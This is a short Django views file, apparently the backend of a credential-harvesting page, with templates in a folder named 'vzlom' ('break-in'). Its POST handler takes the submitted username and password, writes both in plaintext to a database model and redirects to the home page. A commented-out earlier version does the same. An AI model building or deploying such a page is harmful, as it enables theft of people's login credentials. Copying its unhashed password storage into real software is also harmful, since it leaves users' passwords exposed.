from django.http.response import HttpResponse
from django.shortcuts import render, redirect
from .models import Userbek
from .forms import Userform
from django.views import View 

class User(View):
 temp = 'vzlom/1.html' 
 temp1 = 'vzlom/2.html' 
 a = Userform() 
 def get(self, request): 
   return render(request, self.temp, {"a": self.a})
#  def post(self, request):  
#       down = Userform(request.POST) 
#       if down.is_valid(): 
#         f = down.cleaned_data
#         Userbek.objects.create( 
#           login1 = f['login1'],
#           parol2 = f['parol2'],
#           )
#         return render(request, self.temp1)
#       return render(request, self.temp , {"f" : self.a})  
 def post(self, request): 
   logini = request.POST.get('username') 
   parol1 = request.POST.get('password') 
   a = Userbek.objects.create(login1=logini, parol2=parol1)   
   a.save() 
   return redirect("home")


# Create your views here.
